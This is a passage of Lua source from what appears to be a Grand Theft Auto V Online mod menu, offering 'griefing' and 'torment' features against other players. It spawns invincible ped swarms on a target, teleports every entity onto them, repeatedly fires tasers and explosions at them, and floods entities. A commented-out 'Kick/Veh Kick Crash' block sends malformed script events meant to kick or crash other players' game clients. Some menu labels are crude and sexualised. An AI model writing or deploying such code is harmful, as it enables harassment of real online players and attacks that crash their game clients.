    menu.toggle(FathoesArmy, "Fathoe Fuck Player", {"fathoefuck"}, "May cause crash event (A0:335) if spammed.", function(on_toggle)
        if on_toggle then
            menu.trigger_commands("fathoesarmy" .. PLAYER.GET_PLAYER_NAME(pid))
            menu.trigger_commands("toggletppeds" .. PLAYER.GET_PLAYER_NAME(pid))
            menu.trigger_commands("skydivepeds" .. PLAYER.GET_PLAYER_NAME(pid))
            util.toast("Wait 5 Seconds to turn off please.")
        else
            menu.trigger_commands("clearfathoes" .. PLAYER.GET_PLAYER_NAME(pid))
            menu.trigger_commands("toggletppeds" .. PLAYER.GET_PLAYER_NAME(pid))
            menu.trigger_commands("skydivepeds" .. PLAYER.GET_PLAYER_NAME(pid))
            menu.trigger_commands("superc")
            end        
        end)

    menu.click_slider(FathoesArmy, "Spawn Fathoes Army", {"fathoesarmy"}, "", 1, 50, 49, 1, function(val)
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local pos = ENTITY.GET_ENTITY_COORDS(ped, false)
        pos.y = pos.y - 5
        pos.z = pos.z + 1
        local fathoes = util.joaat("IG_Fooliganz_01")
        request_model(fathoes)
        for i = 1, val do
            player_fathoes_army[i] = entities.create_ped(28, fathoes, pos, 0)
            ENTITY.SET_ENTITY_INVINCIBLE(player_fathoes_army[i], true)
            PED.SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(player_fathoes_army[i], true)
            PED.SET_PED_COMPONENT_VARIATION(player_fathoes_army[i], 0, 0, 1, 0)
            TASK.TASK_FOLLOW_TO_OFFSET_OF_ENTITY(player_fathoes_army[i], ped, 0, -0.3, 0, 7.0, -1, 10, true)
            util.yield()
        end 
    end)

    menu.action(FathoesArmy, "Clear Fathoe's", {"clearfathoes"}, "", function()
        for i, ped in ipairs(entities.get_all_peds_as_handles()) do
            if PED.IS_PED_MODEL(ped, util.joaat("IG_Fooliganz_01")) then
                entities.delete_by_handle(ped)
            end
        end
    end)

    local ToplessArmy = menu.list(Armys, "Topless Army", {}, "")

    menu.divider(ToplessArmy, "__________________bruh__________________")

    menu.toggle(ToplessArmy, "Topless Fuck Player", {"toplessfuck"}, "May cause crash event (A0:335) if spammed.", function(on_toggle)
        if on_toggle then
            menu.trigger_commands("toplessarmy" .. PLAYER.GET_PLAYER_NAME(pid))
            menu.trigger_commands("toggletppeds" .. PLAYER.GET_PLAYER_NAME(pid))
            menu.trigger_commands("skydivepeds" .. PLAYER.GET_PLAYER_NAME(pid))
            util.toast("Wait 5 Seconds to turn off please.")
        else
            menu.trigger_commands("cleartoplesshoes" .. PLAYER.GET_PLAYER_NAME(pid))
            menu.trigger_commands("toggletppeds" .. PLAYER.GET_PLAYER_NAME(pid))
            menu.trigger_commands("skydivepeds" .. PLAYER.GET_PLAYER_NAME(pid))
            menu.trigger_commands("superc")
            end        
        end)
    
menu.action(ToplessArmy, "Topless Dancing Army", {"dancingtopless"}, "Spawns 4 of them around the target then dances like a prostitute.", function(on)
    local hooker
    local c
    -- Infront
    c = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(players.user_ped(), 0, 1, 0.0)
    request_model_load(util.joaat('a_f_y_topless_01'))
    hooker = entities.create_ped(28, util.joaat('a_f_y_topless_01'), c, math.random(270))
    local c = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(players.user_ped(), 0, 1, 0.0)
    ENTITY.SET_ENTITY_COORDS(hooker, c.x, c.y, c.z)
    TASK.TASK_START_SCENARIO_IN_PLACE(hooker, "WORLD_HUMAN_PROSTITUTE_HIGH_CLASS", 0, false)
    -- Left
    c = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(players.user_ped(), -1, 0, 0.0)
    request_model_load(util.joaat('a_f_y_topless_01'))
    hooker = entities.create_ped(28, util.joaat('a_f_y_topless_01'), c, math.random(270))
    local c = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(players.user_ped(), -1, 0, 0.0)
    ENTITY.SET_ENTITY_COORDS(hooker, c.x, c.y, c.z)
    TASK.TASK_START_SCENARIO_IN_PLACE(hooker, "WORLD_HUMAN_PROSTITUTE_HIGH_CLASS", 0, false)
    -- Right
    c = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(players.user_ped(), 1, 0, 0.0)
    request_model_load(util.joaat('a_f_y_topless_01'))
    hooker = entities.create_ped(28, util.joaat('a_f_y_topless_01'), c, math.random(270))
    local c = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(players.user_ped(), 1, 0, 0.0)
    ENTITY.SET_ENTITY_COORDS(hooker, c.x, c.y, c.z)
    TASK.TASK_START_SCENARIO_IN_PLACE(hooker, "WORLD_HUMAN_PROSTITUTE_HIGH_CLASS", 0, false)
    -- Behind
    c = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(players.user_ped(), 0, -1, 0.0)
    request_model_load(util.joaat('a_f_y_topless_01'))
    hooker = entities.create_ped(28, util.joaat('a_f_y_topless_01'), c, math.random(270))
    local c = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(players.user_ped(), 0, -1, 0.0)
    ENTITY.SET_ENTITY_COORDS(hooker, c.x, c.y, c.z)
    TASK.TASK_START_SCENARIO_IN_PLACE(hooker, "WORLD_HUMAN_PROSTITUTE_HIGH_CLASS", 0, false)
    end, nil, nil, COMMANDPERM_AGGRESSIVE)


    menu.click_slider(ToplessArmy, "Spawn Topless Army", {"toplessarmy"}, "", 1, 50, 49, 1, function(val)
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local pos = ENTITY.GET_ENTITY_COORDS(ped, false)
        pos.y = pos.y - 5
        pos.z = pos.z + 1
        local fathoes = util.joaat("a_f_y_topless_01")
        request_model(fathoes)
        for i = 1, val do
            player_fathoes_army[i] = entities.create_ped(28, fathoes, pos, 0)
            ENTITY.SET_ENTITY_INVINCIBLE(player_fathoes_army[i], true)
            PED.SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(player_fathoes_army[i], true)
            PED.SET_PED_COMPONENT_VARIATION(player_fathoes_army[i], 0, 0, 1, 0)
            TASK.TASK_FOLLOW_TO_OFFSET_OF_ENTITY(player_fathoes_army[i], ped, 0, -0.3, 0, 7.0, -1, 10, true)
            util.yield()
        end 
    end)

    menu.action(ToplessArmy, "Clear Topless Hoes", {"cleartoplesshoes"}, "", function()
        for i, ped in ipairs(entities.get_all_peds_as_handles()) do
            if PED.IS_PED_MODEL(ped, util.joaat("a_f_y_topless_01")) then
                entities.delete_by_handle(ped)
            end
        end
    end)

--[[

    menu.toggle_loop(griefing, "Kick/Veh Kick Crash", {"opkick"}, "Vehicle Kick I logged but it can crash stand. if you use it on people with no protections they won't crash. So use it on who ever you like but be aware it attacks menus.", function(on_toggle)
        local int_min = -2147483647
        local int_max = 2147483647
        for i = 1, 15 do
            util.trigger_script_event(1 << pid, {-852914485, 3, 0, 0, 1, 0, 0, -1, 31799, math.random(int_min, int_max), math.random(int_min, int_max), 
            math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max),
            math.random(int_min, int_max), pid, math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max)})
            util.trigger_script_event(1 << pid, {-852914485, 3, 0, 0, 1, 0, 0, -1, 31799})
        end
        menu.trigger_commands("givesh" .. players.get_name(pid))
        util.yield()
        for i = 1, 15 do
            util.trigger_script_event(1 << pid, {-852914485, 3, 0, 0, 1, 0, 0, -1, 31799, pid, math.random(int_min, int_max)})
            util.trigger_script_event(1 << pid, {-852914485, 3, 0, 0, 1, 0, 0, -1, 31799})
            util.trigger_script_event(1 << pid, {-852914485, 3, 0, 0, 1, 0, 0, -1, 31799})
        end
    end)
]]
    local getPlayerPed = PLAYER.GET_PLAYER_PED
    local getEntityCoords = ENTITY.GET_ENTITY_COORDS

    local function tpTableToPlayer(tbl, pid)
        if NETWORK.NETWORK_IS_PLAYER_CONNECTED(pid) then
            local c = getEntityCoords(getPlayerPed(pid))
            for _, v in pairs(tbl) do
                if (not PED.IS_PED_A_PLAYER(v)) then
                    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(v, c.x, c.y, c.z, false, false, false)
                end
            end
        end
    end

    function TpAllPeds(player)
        local pedHandles = entities.get_all_peds_as_handles()
        tpTableToPlayer(pedHandles, player)
    end
    function TpAllVehs(player)
        local vehHandles = entities.get_all_vehicles_as_handles()
        tpTableToPlayer(vehHandles, player)
    end
    function TpAllObjects(player)
        local objHandles = entities.get_all_objects_as_handles()
        tpTableToPlayer(objHandles, player)
    end
    function TpAllPickups(player)
        local pickupHandles = entities.get_all_pickups_as_handles()
        tpTableToPlayer(pickupHandles, player)
    end

    local pteleportEntities = menu.list(tpoptions, "Teleport Entities to Player", {}, "")

    menu.action(pteleportEntities, "Teleport ALL Entities to Player", {"tpallentities"}, "WARNING: DO NOT SPECTATE! & Toggle Panic Mode Or You Most Likly Crash.", function()
        menu.trigger_commands("tppeds" .. players.get_name(pid))
        util.yield(100)
        menu.trigger_commands("tpvehs" .. players.get_name(pid))
        util.yield(100)
        menu.trigger_commands("tpobjs" .. players.get_name(pid))
        util.yield(100)
        menu.trigger_commands("tppickups" .. players.get_name(pid))
    end, nil, nil, COMMANDPERM_AGGRESSIVE)

    menu.toggle_loop(pteleportEntities, "Teleport ALL Entities to Player Loop", {"tpallentitiesloop"}, "WARNING: DO NOT SPECTATE! & Toggle Panic Mode Or You Most Likly Crash.", function(on_toggle)
        --notification("Tp All Entities Crash sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
        if on_toggle then
            menu.trigger_commands("tppeds" .. players.get_name(pid))
            util.yield(100)
            menu.trigger_commands("tpvehs" .. players.get_name(pid))
            util.yield(100)
            menu.trigger_commands("tpobjs" .. players.get_name(pid))
            util.yield(100)
            menu.trigger_commands("tppickups" .. players.get_name(pid))
        else
            menu.trigger_commands("tppeds" .. players.get_name(pid))
            util.yield(100)
            menu.trigger_commands("tpvehs" .. players.get_name(pid))
            util.yield(100)
            menu.trigger_commands("tpobjs" .. players.get_name(pid))
            util.yield(100)
            menu.trigger_commands("tppickups" .. players.get_name(pid))
        end
    end)

    menu.action(pteleportEntities, "TP Peds on Player", {"tppeds"}, "", function ()
        TpAllPeds(pid)
    end, nil, nil, COMMANDPERM_AGGRESSIVE)

    menu.toggle_loop(pteleportEntities, "TP Peds on Player", {"toggletppeds"}, "", function (on_toggle)
            if on_toggle then
                TpAllPeds(pid)
            else
                TpAllPeds(pid)
            end
    end)

    menu.action(pteleportEntities, "TP All Vehicles on Player", {"tpvehs"}, "", function ()
        TpAllVehs(pid)
    end, nil, nil, COMMANDPERM_AGGRESSIVE)

    menu.toggle_loop(pteleportEntities, "TP All Vehicles on Player", {"toggletppedstpvehs"}, "", function (on_toggle)
            if on_toggle then
                TpAllVehs(pid)
            else
                TpAllVehs(pid)
            end
    end)

    menu.action(pteleportEntities, "TP All Objects on Player", {"tpobjs"}, "", function ()
        TpAllObjects(pid)
    end, nil, nil, COMMANDPERM_AGGRESSIVE)

    menu.toggle_loop(pteleportEntities, "TP All Objects on Player", {"tpobjs"}, "", function (on_toggle)
            if on_toggle then
                TpAllObjects(pid)
            else
                TpAllObjects(pid)
            end
    end)

    menu.action(pteleportEntities, "TP All Pickups on Player", {"tppickups"}, "", function ()
        TpAllPickups(pid)
    end, nil, nil, COMMANDPERM_AGGRESSIVE)

    menu.toggle_loop(pteleportEntities, "TP All Pickups on Player", {"tppickups"}, "", function (on_toggle)
            if on_toggle then
                TpAllPickups(pid)
            else
                TpAllPickups(pid)
            end
    end)

    local CloneEntities = menu.list(griefing, "Clone Player", {}, "")

    local pclpid = {}

    menu.action(CloneEntities, "Clone", {}, "Clone the player into a ped", function()
        local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local c = ENTITY.GET_ENTITY_COORDS(p)
        local pclone = entities.create_ped(26, ENTITY.GET_ENTITY_MODEL(p), c, 0)
        pclpid [#pclpid + 1] = pclone 
        PED.CLONE_PED_TO_TARGET(p, pclone)
    end, nil, nil, COMMANDPERM_AGGRESSIVE)

menu.action(CloneEntities, "Clone Centipede", {"clonecentipede"}, "Clone the player into a centipede. Note: Click a few times for better results.", function()
        local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local c = ENTITY.GET_ENTITY_COORDS(p)
        local pclone = entities.create_ped(26, ENTITY.GET_ENTITY_MODEL(p), c, 0)
        pclpid [#pclpid + 1] = pclone 
        PED.CLONE_PED_TO_TARGET(p, pclone)
        local c = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), true)
        all_peds = entities.get_all_peds_as_handles()
        local last_ped = 0
        local last_ped_ht = 0
        for k,ped in pairs(all_peds) do
            if not PED.IS_PED_A_PLAYER(ped) and not PED.IS_PED_FATALLY_INJURED(ped) then
                get_control_request(ped)
                if PED.IS_PED_IN_ANY_VEHICLE(ped, true) then
                    TASK.CLEAR_PED_TASKS_IMMEDIATELY(ped)
                    TASK.TASK_LEAVE_ANY_VEHICLE(ped, 0, 16)
                end
    
                ENTITY.DETACH_ENTITY(ped, false, false)
                if last_ped ~= 0 then
                    ENTITY.ATTACH_ENTITY_TO_ENTITY(ped, last_ped, 0, 0.0, 0.0, last_ped_ht-0.5, 0.0, 0.0, 0.0, false, false, false, false, 0, false)
                else
                    ENTITY.SET_ENTITY_COORDS(ped, c.x, c.y, c.z)
                end
                last_ped = ped
            end
        end
    end, nil, nil, COMMANDPERM_AGGRESSIVE)

    local ControlEntities = menu.list(griefing, "Control Entities", {}, "")


    local BlackholeEntities = menu.list(ControlEntities, "Blackholes", {}, "")
    
	local dont_stop = false
	menu.toggle_loop(BlackholeEntities,"Vehicle Blackhole", {"vehicleblackholes"}, "Basically 'impulse like sport mode. but applied to every vehicle.", function(on)
		for k, veh in pairs(entities.get_all_vehicles_as_handles()) do
			local PedInSeat = VEHICLE.GET_PED_IN_VEHICLE_SEAT(veh, -1, false)
			local locspeed2 = speed
        			local holecoords = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), true)
			if not PED.IS_PED_A_PLAYER(PedInSeat) then
				NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh)
	      ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(bh_target), true)
                        vcoords = ENTITY.GET_ENTITY_COORDS(veh, true)
                        speed = 100
                        local x_vec = (holecoords['x']-vcoords['x'])*speed
                        local y_vec = (holecoords['y']-vcoords['y'])*speed
                        local z_vec = ((holecoords['z']+hole_zoff)-vcoords['z'])*speed
                        ENTITY.SET_ENTITY_INVINCIBLE(veh, true)
                        ENTITY.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS(veh, 1, x_vec, y_vec, z_vec, true, false, true, true)
				if not dont_stop and not PAD.IS_CONTROL_PRESSED(2, 71) and not PAD.IS_CONTROL_PRESSED(2, 72) then
					VEHICLE.SET_VEHICLE_FORWARD_SPEED(veh, 0.0);
				end
			end
		end
	end)

    menu.toggle_loop(BlackholeEntities,"Object Blackhole", {"objectblackholes"}, "Basically 'impulse like sport mode. but applied to every object.", function(on)
		for k, veh in pairs(entities.get_all_objects_as_handles()) do
			local PedInSeat = VEHICLE.GET_PED_IN_VEHICLE_SEAT(veh, -1, false)
			local locspeed2 = speed
        			local holecoords = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), true)
			if not PED.IS_PED_A_PLAYER(PedInSeat) then
				NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh)
	      ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(bh_target), true)
                        vcoords = ENTITY.GET_ENTITY_COORDS(veh, true)
                        speed = 100
                        local x_vec = (holecoords['x']-vcoords['x'])*speed
                        local y_vec = (holecoords['y']-vcoords['y'])*speed
                        local z_vec = ((holecoords['z']+hole_zoff)-vcoords['z'])*speed
                        ENTITY.SET_ENTITY_INVINCIBLE(veh, true)
                        ENTITY.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS(veh, 1, x_vec, y_vec, z_vec, true, false, true, true)
				if not dont_stop and not PAD.IS_CONTROL_PRESSED(2, 71) and not PAD.IS_CONTROL_PRESSED(2, 72) then
					VEHICLE.SET_VEHICLE_FORWARD_SPEED(veh, 0.0);
				end
			end
		end
	end)

    menu.toggle_loop(BlackholeEntities,"Ped Blackhole", {"pedblackholes"}, "Turn on undead to not effect you. Basically 'impulse like sport mode. but applied to every ped.", function(on)
		for k, veh in pairs(entities.get_all_peds_as_handles()) do
			local PedInSeat = VEHICLE.GET_PED_IN_VEHICLE_SEAT(veh, -1, false)
			local locspeed2 = speed
        			local holecoords = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), true)
			if not PED.IS_PED_A_PLAYER(PedInSeat) then
				NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh)
	      ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(bh_target), true)
                        vcoords = ENTITY.GET_ENTITY_COORDS(veh, true)
                        speed = 100
                        local x_vec = (holecoords['x']-vcoords['x'])*speed
                        local y_vec = (holecoords['y']-vcoords['y'])*speed
                        local z_vec = ((holecoords['z']+hole_zoff)-vcoords['z'])*speed
                        ENTITY.SET_ENTITY_INVINCIBLE(veh, true)
                        ENTITY.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS(veh, 1, x_vec, y_vec, z_vec, true, false, true, true)
				if not dont_stop and not PAD.IS_CONTROL_PRESSED(2, 71) and not PAD.IS_CONTROL_PRESSED(2, 72) then
					VEHICLE.SET_VEHICLE_FORWARD_SPEED(veh, 0.0);
				    end
			    end
            end
        end)

    hole_zoff = 50
    menu.slider(BlackholeEntities, "Blackhole Z-offset", {"blackholeoffset"}, "", 0, 100, 50, 10, function(s)
    hole_zoff = s
    end)

    
	centipedegriefing = menu.list(ControlEntities, "Human Centipede", {}, "", function(); end)

    menu.action(centipedegriefing, "Human Centipede", {"centipede"}, "", function()
        local c = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), true)
        all_peds = entities.get_all_peds_as_handles()
        local last_ped = 0
        local last_ped_ht = 0
        for k,ped in pairs(all_peds) do
            if not PED.IS_PED_A_PLAYER(ped) and not PED.IS_PED_FATALLY_INJURED(ped) then
                get_control_request(ped)
                if PED.IS_PED_IN_ANY_VEHICLE(ped, true) then
                    TASK.CLEAR_PED_TASKS_IMMEDIATELY(ped)
                    TASK.TASK_LEAVE_ANY_VEHICLE(ped, 0, 16)
                end
    
                ENTITY.DETACH_ENTITY(ped, false, false)
                if last_ped ~= 0 then
                    ENTITY.ATTACH_ENTITY_TO_ENTITY(ped, last_ped, 0, 0.0, 0.0, last_ped_ht-0.5, 0.0, 0.0, 0.0, false, false, false, false, 0, false)
                else
                    ENTITY.SET_ENTITY_COORDS(ped, c.x, c.y, c.z)
                end
                last_ped = ped
            end
        end
    end, nil, nil, COMMANDPERM_AGGRESSIVE)
    
    menu.toggle_loop(centipedegriefing, "Human Centipede", {"togglecentipede"}, "", function(on_toggle)
        local c = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), true)
        all_peds = entities.get_all_peds_as_handles()
        local last_ped = 0
        local last_ped_ht = 0
        for k,ped in pairs(all_peds) do
            if not PED.IS_PED_A_PLAYER(ped) and not PED.IS_PED_FATALLY_INJURED(ped) then
                get_control_request(ped)
                if PED.IS_PED_IN_ANY_VEHICLE(ped, true) then
                    TASK.CLEAR_PED_TASKS_IMMEDIATELY(ped)
                    TASK.TASK_LEAVE_ANY_VEHICLE(ped, 0, 16)
                end
    
                ENTITY.DETACH_ENTITY(ped, false, false)
                if last_ped ~= 0 then
                    ENTITY.ATTACH_ENTITY_TO_ENTITY(ped, last_ped, 0, 0.0, 0.0, last_ped_ht-0.5, 0.0, 0.0, 0.0, false, false, false, false, 0, false)
                else
                    ENTITY.SET_ENTITY_COORDS(ped, c.x, c.y, c.z)
                end
                last_ped = ped
            end
        end
    end, nil, nil, COMMANDPERM_AGGRESSIVE)
    
    menu.toggle_loop(ControlEntities, "Sky Dive Peds", {"skydivepeds"}, "", function()
        local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local c = ENTITY.GET_ENTITY_COORDS(p)
                all_peds = entities.get_all_peds_as_handles()
                player_ped = PLAYER.PLAYER_PED_ID()
                for k,ped in pairs(all_peds) do
                    if not PED.IS_PED_A_PLAYER(ped) then
                        TASK.TASK_SKY_DIVE(ped)
                    end
            end
    end, nil, nil, COMMANDPERM_AGGRESSIVE)

    menu.toggle_loop(ControlEntities, "Writher Peds", {"writherpeds"}, "", function()
        local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local c = ENTITY.GET_ENTITY_COORDS(p)
                all_peds = entities.get_all_peds_as_handles()
                player_ped = PLAYER.PLAYER_PED_ID()
                for k,ped in pairs(all_peds) do
                    if not PED.IS_PED_A_PLAYER(ped) then
                        TASK.TASK_WRITHE(ped, player_ped, -1, 0)
                    end
            end
    end, nil, nil, COMMANDPERM_AGGRESSIVE)

    menu.toggle_loop(ControlEntities, "Vault Peds", {"vaultpeds"}, "", function()
        local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local c = ENTITY.GET_ENTITY_COORDS(p)
                all_peds = entities.get_all_peds_as_handles()
                player_ped = PLAYER.PLAYER_PED_ID()
                for k,ped in pairs(all_peds) do
                    if not PED.IS_PED_A_PLAYER(ped) then
                        TASK.TASK_CLIMB(ped, true)
                    end
            end
    end, nil, nil, COMMANDPERM_AGGRESSIVE)

    menu.toggle_loop(ControlEntities, "Cower Peds", {"cowerpeds"}, "", function()
        local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local c = ENTITY.GET_ENTITY_COORDS(p)
                all_peds = entities.get_all_peds_as_handles()
                player_ped = PLAYER.PLAYER_PED_ID()
                for k,ped in pairs(all_peds) do
                    if not PED.IS_PED_A_PLAYER(ped) then
                        TASK.TASK_COWER(ped, -1)
                    end
            end
    end, nil, nil, COMMANDPERM_AGGRESSIVE)

    menu.toggle_loop(ControlEntities, "Cover Peds", {"coverpeds"}, "", function()
        local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local c = ENTITY.GET_ENTITY_COORDS(p)
                all_peds = entities.get_all_peds_as_handles()
                player_ped = PLAYER.PLAYER_PED_ID()
                for k,ped in pairs(all_peds) do
                    if not PED.IS_PED_A_PLAYER(ped) then
                        TASK.TASK_STAY_IN_COVER(ped)
                    end
            end
    end, nil, nil, COMMANDPERM_AGGRESSIVE)

    local tormentplayer = menu.list(griefing, "Torment Loops")

    player_toggle_loop(tormentplayer, pid, "Taser", {"taseron"}, "", function()
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local pos = ENTITY.GET_ENTITY_COORDS(ped)
        for i = 1, 50 do
            MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x, pos.y, pos.z + 1, pos.x, pos.y, pos.z, 0, true, util.joaat("weapon_stungun"), players.user_ped(), false, true, 1.0)
        end
        util.yield()
    end)

    player_toggle_loop(tormentplayer, pid, "Up-n-Atomizer", {"atomizeron"}, "", function()
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local pos = ENTITY.GET_ENTITY_COORDS(ped)
        for i = 1, 24 do
            MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x, pos.y, pos.z + 1, pos.x, pos.y, pos.z, 0, true, util.joaat("weapon_raypistol"), players.user_ped(), false, true, 1.0)
        end
        util.yield()
    end)

    player_toggle_loop(tormentplayer, pid, "EMP", {"emploop"}, "", function()
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local pos = ENTITY.GET_ENTITY_COORDS(ped)
        for i = 1, 49 do
            MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x, pos.y, pos.z + 1, pos.x, pos.y, pos.z, 0, true, util.joaat("weapon_emplauncher"), players.user_ped(), false, true, 1.0)
        end
        util.yield()
    end)

    player_toggle_loop(tormentplayer, pid, "Flare", {"flareon"}, "", function()
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local pos = ENTITY.GET_ENTITY_COORDS(ped)
        for i = 1, 49 do
            MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x, pos.y, pos.z + 1, pos.x, pos.y, pos.z, 0, true, util.joaat("weapon_flare"), players.user_ped(), false, true, 1.0)
        end
        util.yield()
    end)

    player_toggle_loop(tormentplayer, pid, "Firework", {"fireworkon"}, "", function()
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local pos = ENTITY.GET_ENTITY_COORDS(ped)
        for i = 1, 30 do
            MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x, pos.y, pos.z + 1, pos.x, pos.y, pos.z, 0, true, util.joaat("weapon_firework"), players.user_ped(), false, true, 1.0)
        end
        util.yield()
    end)

    menu.toggle_loop(tormentplayer, "Asteroid Smash", {"asteroidon"}, "Crush the player with an asteroid", function() 
        local coords = players.get_position(pid)
        coords.z = coords['z'] + 15.0
        local asteroid = entities.create_object(3751297495, coords)
        ENTITY.SET_ENTITY_DYNAMIC(asteroid, true)
    end)

    menu.toggle_loop(tormentplayer, "Ragdoll", {"ragdollon"}, "Keeps target ragdolled", function()
        local coords = players.get_position(pid)
        coords.z = coords['z'] - 2.0
        FIRE.ADD_EXPLOSION(coords.x, coords.y, coords.z, 11, 1, false, true, 0, true)
        util.yield(10)
    end)

    menu.toggle_loop(tormentplayer, "Flames", {"fireon"}, "Spam fire beneath the target", function()
        local coords = players.get_position(pid)
        coords.z = coords['z'] - 2.0
        FIRE.ADD_EXPLOSION(coords.x, coords.y, coords.z, 12, 1, true, false, 0, false)
        util.yield(25)
    end)

    menu.toggle_loop(tormentplayer, "Water Jet", {"wateron"}, "Spam water jets beneath the target", function()
        local coords = players.get_position(pid)
        coords.z = coords['z'] - 2.0
        FIRE.ADD_EXPLOSION(coords.x, coords.y, coords.z, 13, 1, true, false, 0, false)
        util.yield(25)
    end)

    menu.toggle_loop(tormentplayer, "Flame path", {"flamepathon"}, "They better run", function()
        local coords = players.get_position(pid)
        --coords.z = coords['z'] + 1.5
        FIRE.ADD_EXPLOSION(coords.x, coords.y, coords.z, 38, 0, false, false, 0, false)
        util.yield(65)
    end)

    
    local crash_ents = {}
    local crash_toggle = false
    menu.toggle(tormentplayer, "Constructipede", {"constructipede"}, "", function(val)
        crash_toggle = val
            if val then
                local ped_mdl = util.joaat("s_m_y_construct_01")
                local ply_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                local ped_pos = players.get_position(pid)
                ped_pos.z += 3
                request_model(ped_mdl)
                for i = 1, 49 do
                    local ped = entities.create_ped(26, ped_mdl, ped_pos, 0)
                    crash_ents[i] = ped
                    PED.SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(ped, true)
                    TASK.TASK_SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(ped, true)
                    ENTITY.SET_ENTITY_INVINCIBLE(ped, true)
                    ENTITY.SET_ENTITY_VISIBLE(ped, true)

                    local c = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), true)
                    all_peds = entities.get_all_peds_as_handles()
                    local last_ped = 0
                    local last_ped_ht = 0
                    for k,ped in pairs(all_peds) do
                        if not PED.IS_PED_A_PLAYER(ped) and not PED.IS_PED_FATALLY_INJURED(ped) then
                            get_control_request(ped)
                            if PED.IS_PED_IN_ANY_VEHICLE(ped, true) then
                                TASK.CLEAR_PED_TASKS_IMMEDIATELY(ped)
                                TASK.TASK_LEAVE_ANY_VEHICLE(ped, 0, 16)
                            end
                
                            ENTITY.DETACH_ENTITY(ped, false, false)
                            if last_ped ~= 0 then
                                ENTITY.ATTACH_ENTITY_TO_ENTITY(ped, last_ped, 0, 0, 0, last_ped_ht, 1, 05, 0, 0, false, false, false, false, 0, false)
                            else
                                ENTITY.SET_ENTITY_COORDS(ped, c.x, c.y, c.z)
                            end
                            last_ped = ped
                        end
                    end
                end
                repeat
                    for k, ped in crash_ents do
                        TASK.CLEAR_PED_TASKS_IMMEDIATELY(ped)
                    end
                    for k, v in entities.get_all_objects_as_pointers() do
                        if entities.get_model_hash(v) == util.joaat("prop_tool_jackham") then
                            entities.delete_by_pointer(v)
                        end
                    end
                    util.yield_once()
                until not (crash_toggle and players.exists(pid))
                crash_toggle = false
                for k, obj in crash_ents do
                    entities.delete_by_handle(obj)
                end
                crash_ents = {}
            else
                for k, obj in crash_ents do
                    entities.delete_by_handle(obj)
                end
                crash_ents = {}
            end
    end)
    
    
    local crash_ents = {}
    local crash_toggle = false
    menu.toggle(tormentplayer, "Jack Hammmer Noise", {"jacknoise"}, "Sends Jack Hammmers to cause noise.", function(val)
        crash_toggle = val
            if val then
                local ped_mdl = util.joaat("s_m_y_construct_01")
                local ply_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                local ped_pos = players.get_position(pid)
                ped_pos.z += 3
                request_model(ped_mdl)
                for i = 1, 48 do
                    local ped = entities.create_ped(26, ped_mdl, ped_pos, 0)
                    crash_ents[i] = ped
